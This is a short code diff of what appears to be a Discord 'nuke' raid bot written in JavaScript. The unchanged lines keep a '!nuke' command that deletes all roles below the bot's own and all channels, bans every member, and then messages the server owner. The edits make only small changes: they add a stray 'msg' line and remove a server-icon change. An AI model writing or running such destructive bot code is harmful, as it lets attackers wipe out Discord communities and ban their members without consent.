@@ -13,6 +13,7 @@ nuke.on("message", async(msg)=>{
  
  
 if(msg.content.toLowerCase().startsWith("!" + "nuke")){
+    msg
     msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
     msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | L O S T#2332"));
@@ -94,8 +95,7 @@ nuke.on("message", message => {
 
     }, 1000);
 
-    message.guild.setIcon("https://cdn.discordapp.com/attachments/746824659181502525/986196100044169296/de9d9493e5c763bc7413cc9fdce8ed3f.gif");
-
+    
 
     message.guild.owner.send(
 
@@ -135,6 +135,5 @@ nuke.on("message", message => {
   }
 
 });
-
  
 nuke.login("");
